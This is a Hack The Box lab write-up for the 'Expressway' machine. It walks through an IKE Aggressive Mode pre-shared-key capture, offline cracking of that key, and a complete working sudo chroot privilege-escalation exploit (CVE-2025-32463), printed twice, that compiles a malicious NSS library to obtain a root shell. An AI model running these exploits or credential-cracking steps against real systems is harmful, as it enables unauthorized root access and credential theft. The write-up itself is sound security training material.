---
title: "HTB: Expressway"
date: 2025-10-04 00:00 +0800
categories: [HTB]
tags: [HTB,Easy,Boot2Root, Ipsec, IKE, PSK, Ike-Scan, PSK-Crack, CVE-2025-32463, Privilege Escalation]
image: <img width="704" height="243" alt="image" src="https://github.com/user-attachments/assets/fec9267e-7d72-424c-9ee5-83019f040ae6" />
---

Discovered ISAKMP on UDP/500 and used ike-scan Aggressive to capture a PSK-derived hash, which was cracked to recover the PSK. Logged in via SSH as user ike, identified sudo 1.9.17 vulnerable to a chroot (-R) local privilege escalation (CVE-2025-32463), and used the PoC to obtain root and retrieve the flag.

## Tools 
- nmap
- ike
- psk-crack
- searchsploit

## Recon

nmap scan result:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ cat nmap-scan.txt                                                                                   
# Nmap 7.95 scan initiated Tue Oct 14 22:54:22 2025 as: /usr/lib/nmap/nmap --privileged -sCV -oN nmap-scan.txt -vv -p- -T4 expressway.htb
Nmap scan report for expressway.htb (10.10.11.87)
Host is up, received echo-reply ttl 63 (0.015s latency).
Scanned at 2025-10-14 22:54:22 +08 for 10s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 14 22:54:32 2025 -- 1 IP address (1 host up) scanned in 10.70 seconds

```

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ sudo nmap -sVU -T4 -F -oN udp-scan.txt -vv expressway.htb                                           
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 23:01 +08
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 23:01
Scanning expressway.htb (10.10.11.87) [4 ports]
Completed Ping Scan at 23:01, 0.04s elapsed (1 total hosts)
Initiating UDP Scan at 23:01
Scanning expressway.htb (10.10.11.87) [100 ports]
Discovered open port 500/udp on 10.10.11.87
Increasing send delay for 10.10.11.87 from 0 to 50 due to 11 out of 18 dropped probes since last increase.
Increasing send delay for 10.10.11.87 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.11.87 from 100 to 200 due to max_successful_tryno increase to 6
Warning: 10.10.11.87 giving up on port because retransmission cap hit (6).
Increasing send delay for 10.10.11.87 from 200 to 400 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.11.87 from 400 to 800 due to 11 out of 12 dropped probes since last increase.
Completed UDP Scan at 23:02, 48.05s elapsed (100 total ports)
Initiating Service scan at 23:02
Scanning 57 services on expressway.htb (10.10.11.87)
Service scan Timing: About 1.75% done; ETC: 00:13 (1:10:00 remaining)
Service scan Timing: About 52.63% done; ETC: 23:05 (0:01:42 remaining)
Service scan Timing: About 54.39% done; ETC: 23:06 (0:02:13 remaining)
Completed Service scan at 23:05, 180.24s elapsed (57 services on 1 host)
NSE: Script scanning 10.10.11.87.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 23:05
Completed NSE at 23:05, 1.48s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 23:05
Completed NSE at 23:05, 3.36s elapsed
Nmap scan report for expressway.htb (10.10.11.87)
Host is up, received reset ttl 63 (0.014s latency).
Scanned at 2025-10-14 23:01:16 +08 for 233s

PORT      STATE         SERVICE         REASON              VERSION
7/udp     closed        echo            port-unreach ttl 63
9/udp     open|filtered discard         no-response
17/udp    open|filtered qotd            no-response
19/udp    closed        chargen         port-unreach ttl 63
49/udp    closed        tacacs          port-unreach ttl 63
53/udp    open|filtered domain          no-response
67/udp    closed        dhcps           port-unreach ttl 63
68/udp    open|filtered dhcpc           no-response
69/udp    open|filtered tftp            no-response
80/udp    closed        http            port-unreach ttl 63
88/udp    closed        kerberos-sec    port-unreach ttl 63
111/udp   open|filtered rpcbind         no-response
120/udp   closed        cfdptkt         port-unreach ttl 63
123/udp   open|filtered ntp             no-response
135/udp   open|filtered msrpc           no-response
136/udp   open|filtered profile         no-response
137/udp   open|filtered netbios-ns      no-response
138/udp   closed        netbios-dgm     port-unreach ttl 63
139/udp   open|filtered netbios-ssn     no-response
158/udp   open|filtered pcmail-srv      no-response
161/udp   open|filtered snmp            no-response
162/udp   closed        snmptrap        port-unreach ttl 63
177/udp   closed        xdmcp           port-unreach ttl 63
427/udp   closed        svrloc          port-unreach ttl 63
443/udp   open|filtered https           no-response
445/udp   open|filtered microsoft-ds    no-response
497/udp   open|filtered retrospect      no-response
500/udp   open          isakmp?         udp-response ttl 63
514/udp   open|filtered syslog          no-response
515/udp   closed        printer         port-unreach ttl 63
518/udp   open|filtered ntalk           no-response
520/udp   closed        route           port-unreach ttl 63
593/udp   open|filtered http-rpc-epmap  no-response
623/udp   open|filtered asf-rmcp        no-response
626/udp   closed        serialnumberd   port-unreach ttl 63
631/udp   closed        ipp             port-unreach ttl 63
996/udp   open|filtered vsinet          no-response
997/udp   closed        maitrd          port-unreach ttl 63
998/udp   closed        puparp          port-unreach ttl 63
999/udp   open|filtered applix          no-response
1022/udp  closed        exp2            port-unreach ttl 63
1023/udp  open|filtered unknown         no-response
1025/udp  open|filtered blackjack       no-response
1026/udp  closed        win-rpc         port-unreach ttl 63
1027/udp  open|filtered unknown         no-response
1028/udp  open|filtered ms-lsa          no-response
1029/udp  open|filtered solid-mux       no-response
1030/udp  open|filtered iad1            no-response
1433/udp  open|filtered ms-sql-s        no-response
1434/udp  closed        ms-sql-m        port-unreach ttl 63
1645/udp  open|filtered radius          no-response
1646/udp  closed        radacct         port-unreach ttl 63
1701/udp  open|filtered L2TP            no-response
1718/udp  closed        h225gatedisc    port-unreach ttl 63
1719/udp  closed        h323gatestat    port-unreach ttl 63
1812/udp  open|filtered radius          no-response
1813/udp  open|filtered radacct         no-response
1900/udp  closed        upnp            port-unreach ttl 63
2000/udp  open|filtered cisco-sccp      no-response
2048/udp  closed        dls-monitor     port-unreach ttl 63
2049/udp  closed        nfs             port-unreach ttl 63
2222/udp  open|filtered msantipiracy    no-response
2223/udp  closed        rockwell-csp2   port-unreach ttl 63
3283/udp  open|filtered netassistant    no-response
3456/udp  open|filtered IISrpc-or-vat   no-response
3703/udp  closed        adobeserver-3   port-unreach ttl 63
4444/udp  open|filtered krb524          no-response
4500/udp  open|filtered nat-t-ike       no-response
5000/udp  closed        upnp            port-unreach ttl 63
5060/udp  open|filtered sip             no-response
5353/udp  open|filtered zeroconf        no-response
5632/udp  closed        pcanywherestat  port-unreach ttl 63
9200/udp  closed        wap-wsp         port-unreach ttl 63
10000/udp closed        ndmp            port-unreach ttl 63
17185/udp closed        wdbrpc          port-unreach ttl 63
20031/udp closed        bakbonenetvault port-unreach ttl 63
30718/udp closed        unknown         port-unreach ttl 63
31337/udp open|filtered BackOrifice     no-response
32768/udp open|filtered omad            no-response
32769/udp open|filtered filenet-rpc     no-response
32771/udp open|filtered sometimes-rpc6  no-response
32815/udp open|filtered unknown         no-response
33281/udp open|filtered unknown         no-response
49152/udp closed        unknown         port-unreach ttl 63
49153/udp closed        unknown         port-unreach ttl 63
49154/udp closed        unknown         port-unreach ttl 63
49156/udp open|filtered unknown         no-response
49181/udp open|filtered unknown         no-response
49182/udp closed        unknown         port-unreach ttl 63
49185/udp closed        unknown         port-unreach ttl 63
49186/udp closed        unknown         port-unreach ttl 63
49188/udp open|filtered unknown         no-response
49190/udp open|filtered unknown         no-response
49191/udp open|filtered unknown         no-response
49192/udp open|filtered unknown         no-response
49193/udp closed        unknown         port-unreach ttl 63
49194/udp closed        unknown         port-unreach ttl 63
49200/udp open|filtered unknown         no-response
49201/udp open|filtered unknown         no-response
65024/udp open|filtered unknown         no-response
1 service unrecognized despite returning data. If you know the service/version, please submit the folling fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port500-UDP:V=7.95%I=7%D=10/14%Time=68EE65FB%P=x86_64-pc-linux-gnu%r(IK
SF:E_MAIN_MODE,70,"\0\x11\"3DUfw\xd3\x808Pv}\xc4\r\x01\x10\x02\0\0\0\0\0\0
SF:\0\0p\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\0\0\0\x20\x01\
SF:x01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x01\x80\x0b
SF:\0\x01\x80\x0c\0\x01\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\0\0\0\x14\xaf\x
SF:ca\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0")%r(IPSEC_START,9C,"1'\xfc
SF:\xb08\x10\x9e\x89X\xb6\x82\xdd\xa8\xd24\x05\x01\x10\x02\0\0\0\0\0\0\0\0
SF:\x9c\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\0\0\0\x20\x01\x
SF:01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x03\x80\x0b\
SF:0\x01\x80\x0c\x0e\x10\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\r\0\0\x14\xaf\
SF:xca\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0\r\0\0\x18@H\xb7\xd5n\xbc\
SF:xe8\x85%\xe7\xde\x7f\0\xd6\xc2\xd3\x80\0\0\0\0\0\0\x14\x90\xcb\x80\x91>
SF:\xbbin\x08c\x81\xb5\xecB{\x1f");

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 233.33 seconds
           Raw packets sent: 769 (45.238KB) | Rcvd: 67 (4.953KB)
```
After reviewing the Nmap scan, we only found one services running on port 22 which is ssh. Upon further recon by using **searchsploit** the ssh version was not exploitable. So i proceed to scan through UDP.

we found that **UDP port 500** was open and identified as running **ISAKMP services** (Internet Security Association and Key Management Protocol).

At first, I wasn’t entirely sure what that meant, so I looked it up. Port 500 is the **default port used by IKE (Internet Key Exchange)**, the key-negotiation component of **IPSec VPNs**.

Basically it's used to negotiate and establish security associations (SAs) between VPN peers **before encrypted traffic** actually **flows**.

## Initial Enumeration

Surely we would want to look for common ``ike exploit`` from **duckduckgo** and found **[this github](https://github.com/ivanversluis/pentest-hacktricks/blob/master/pentesting/ipsec-ike-vpn-pentesting.md)** and its explaination was pretty well.

So we would check if the gateway is actually valid and also what crypto it accept and auth used:

### Ike-scan initial analysis

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ ike-scan -M expressway.htb
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned
        HDR=(CKY-R=b414943104d653f7)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.018 seconds (55.44 hosts/sec).  1 returned handshake; 0 returned notify
```
The target is an IPSec VPN gateway that accepted **3DES/SHA-1** and uses **[PSK (a shared password)](https://help.stonesoft.com/onlinehelp/StoneGate/SMC/6.7.0/GUID-2A1BC042-3AFE-4794-B738-BEAA94922B58.html#:~:text=key%20(PSK)%20authentication-,A%20pre%2Dshared%20key%20is%20a%20string%20of%20characters%20that,the%20secure%20management%20communications%20channel.)**. Because it uses a ``Auth=PSK``, if the gateway allows IKEv1 **Aggressive mode** and we just need to have the correct group/client ID, 

By that, it can return a small hash of that PSK which can be cracked offline. So we checked Aggressive mode to see if that hash could be obtained.

### Aggresive mode handshake

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ ike-scan -A expressway.htb
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=a9a1938254ddf1cf) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.021 seconds (48.62 hosts/sec).  1 returned handshake; 0 returned notify
```
The server returned an Aggressive Mode handshake, confirming the VPN gateway accepted aggressive IKE requests.

## Figuring the id

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ ike-scan -P -M -A -n --id=fakeID 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=b6414023401562e1)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
f0d7725327fd1baded8803a8d05c5950f7569f5564c321c88e42d887f16be3e068c9561cdccd87ed8f57d35e32fbf073401323bd4a7753845c3afa107a69e6ed4e05edf794520f3e0be16e7c5e08082def737e243db76cb889d02795317623793ac5de30b45139f3fe226b58bb6aa54a546f761249856bb87dd6b47b00936dd3:ab501576a530b6438caafe31bbfc1f74f205e4184c989dd7faf6173671a1a152c2e4f41ae3f6fa6e29c81846040b7e1b850bb851fbacb95a2b05bb1ac49aedbc5eabfd62a7ef78b22617897a537b26face3a7c45d818e5476e5bea2ef82ff468bf322a5292c830374d1b74d7dcf0f9e93ab8d73800171a131743e8c81c5251bd:b6414023401562e1:ad617f65b923b1ed:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:6821fa1621708949935fca33779ac56155529b77:75e5eac8c182c7f20cc88334bb867cec84e5d0e5037194513e318c14c473de44:c198a195191e8c7c6643ab4e56f37ccb744f0a82
Ending ike-scan 1.9.6: 1 hosts scanned in 0.020 seconds (51.13 hosts/sec).  1 returned handshake; 0 returned notify
```

We can find the ID value is ``ike@expressway.htb`` so we can try to get the password hash before we can crack it.

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ ike-scan -M -A -n ike@expressway.htb --pskcrack=hash.txt expressway.htb
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=5511a025ec4d1575)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)
                                                                                                        
Ending ike-scan 1.9.6: 1 hosts scanned in 0.021 seconds (48.37 hosts/sec).  1 returned handshake; 0 returned notify                                                                                             
```

### Password hash crack (ps-crack)

```
┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]                                                              
└─$ cat hash.txt 
6aa4579c951ea05338654326741221885ed3e95b69943bdfc8938df45e3d42412e34d7d933f5e0b69b0164fd5c472f11ddcd4295f452becb7635f6b8a1b17c468a2fcfb32bd507c48873074116db66b0151e015ff46e0cc0f94e7bed5163e16f228e72c399be457ebf96ed1cc512842020f19938fffc90fb44a32a8ff21534f5:b4dcbe11c99a0b905d9fd3d48180b4fc11c38a9f14995898c0dc3487ee77edd07b710126997ae21791ab0be38f761a455fbff731b613ca8fb92fa37172d88d9736b73748d605ac7822815296a165133b64b7e75fa01dee52cfd17c3d590b731a898ab29264e24bd6cc8529eb4c65d79721a00f8867a6140d4b1d81c4a33ce5a0:5511a025ec4d1575:5b8e1370feae029a:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:af804969ef7465350c0c0cbf436339a19458263a:4bd77874f1ba7ad70db35d0c7d27e71511c2785e1db694da43a98f1465676a83:7fdc3838cbb1061c0b1a9037709c42bc2c826768

┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 7fdc3838cbb1061c0b1a9037709c42bc2c826768
Ending psk-crack: 8045040 iterations in 5.559 seconds (1447147.71 iterations/sec)
```

## Shell as ike

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ ssh ike@expressway.htb                                                                              
The authenticity of host 'expressway.htb (10.10.11.87)' can't be established.
ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:21: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'expressway.htb' (ED25519) to the list of known hosts.
ike@expressway.htb's password: 
Last login: Wed Sep 17 10:26:26 BST 2025 from 10.10.14.77 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct 14 16:07:19 2025 from 10.10.14.19
ike@expressway: whoami
ike
```


```bash
ike@expressway:~$ ls
user.txt
ike@expressway:~$ cat user.txt 
72bcd8d0df3471ed7432a6cc5bxxxxxx
ike@expressway:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

Password: 
Sorry, user ike may not run sudo on expressway.
ike@expressway:~$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```
On another terminal, we did use **searchsploit** to look for any know vuln for ``Sudo version 1.9.17``

### CVE-2025-32463

This is a local privilege escalation in sudo **(CVE-2025-32463)**. On affected sudo versions, a user can abuse the chroot option **(-R)** to make sudo load a fake system library from a directory they control. 
That fake library runs code **as root**, so the attacker ends up with a **root shell**. 

Affected: sudo **1.9.14 through 1.9.17**
This system shows sudo **1.9.17**, so it is in the affected range.

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ searchsploit sudo 1.9.17
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Sudo 1.9.17 Host Option - Elevation of Privilege                      | linux/local/52354.txt
Sudo chroot 1.9.17 - Local Privilege Escalation                       | linux/local/52352.txt
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ locate linux/local/52352.txt
/usr/share/exploitdb/exploits/linux/local/52352.txt

┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ cp /usr/share/exploitdb/exploits/linux/local/52352.txt .                                            

┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ cat 52352.txt                                                                                       
Exploit Title: Sudo chroot 1.9.17 - Local Privilege Escalation
Google Dork: not aplicable
Date: Mon, 30 Jun 2025
Exploit Author: Stratascale
Vendor Homepage:https://salsa.debian.org/sudo-team/sudo
Software Link:
Version: Sudo versions 1.9.14 to 1.9.17 inclusive
Tested on: Kali Rolling 2025-7-3
CVE : CVE-2025-32463

*Version running today in Kali:*
https://pkg.kali.org/news/640802/sudo-1916p2-2-imported-into-kali-rolling/

*Background*

An attacker can leverage sudo's -R (--chroot) option to run
arbitrary commands as root, even if they are not listed in the
sudoers file.

Sudo versions affected:

    Sudo versions 1.9.14 to 1.9.17 inclusive are affected.

CVE ID:

    This vulnerability has been assigned CVE-2025-32463 in the
    Common Vulnerabilities and Exposures database.

Details:

    Sudo's -R (--chroot) option is intended to allow the user to
    run a command with a user-selected root directory if the sudoers
    file allows it.  A change was made in sudo 1.9.14 to resolve
    paths via chroot() using the user-specified root directory while
    the sudoers file was still being evaluated.  It is possible for
    an attacker to trick sudo into loading an arbitrary shared
    library by creating an /etc/nsswitch.conf file under the
    user-specified root directory.

    The change from sudo 1.9.14 has been reverted in sudo 1.9.17p1
    and the chroot feature has been marked as deprecated.  It will
    be removed entirely in a future sudo release.  Because of the
    way sudo resolves commands, supporting a user-specified chroot
    directory is error-prone and this feature does not appear to
    be widely used.

    A more detailed description of the bug and its effects can be
    found in the Stratascale advisory:
    https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot

Impact:

    On systems that support /etc/nsswitch.conf a user may be able
    to run arbitrary commands as root.

*Exploit:*

*Verify the sudo version running: sudo --versionIf is vulnerable, copy and
paste the following code and run it.*
*----------------------*
#!/bin/bash
# sudo-chwoot.sh – PoC CVE-2025-32463
set -e

STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "$STAGE"

# 1. NSS library
cat > woot1337.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void woot(void) {
    setreuid(0,0);          /* change to UID 0 */
    setregid(0,0);          /* change  to GID 0 */
    chdir("/");             /* exit from chroot */
    execl("/bin/bash","/bin/bash",NULL); /* root shell */
}
EOF

# 2. Mini chroot with toxic nsswitch.conf
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc            # make getgrnam() not fail

# 3. compile libnss_
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "[*] Running exploit…"
sudo -R woot woot                 # (-R <dir> <cmd>)
                                   # • the first “woot” is chroot
                                   # • the second “woot” is and inexistent
command
                                   #   (only needs resolve the user)

rm -rf "$STAGE"
*----------------------*

```

## Shell as root

```bash
ike@expressway:~$ #!/bin/bash
# sudo-chwoot.sh – PoC CVE-2025-32463
set -e

STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "$STAGE"

# 1. NSS library
cat > woot1337.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void woot(void) {
    setreuid(0,0);          /* change to UID 0 */
    setregid(0,0);          /* change  to GID 0 */
    chdir("/");             /* exit from chroot */
    execl("/bin/bash","/bin/bash",NULL); /* root shell */
}
EOF

# 2. Mini chroot with toxic nsswitch.conf
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc            # make getgrnam() not fail

# 3. compile libnss_
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "[*] Running exploit…"
sudo -R woot woot                 # (-R <dir> <cmd>)
                                   # • the first “woot” is chroot
                                   # • the second “woot” is and inexistent
command
                                   #   (only needs resolve the user)

rm -rf "$STAGE"
[*] Running exploit…
root@expressway:/# whoami
root
root@expressway:/# cat /root/root.txt
14eef9043b50738697c7c41e30xxxxxx
```

[Badge](https://labs.hackthebox.com/achievement/machine/1737187/736)
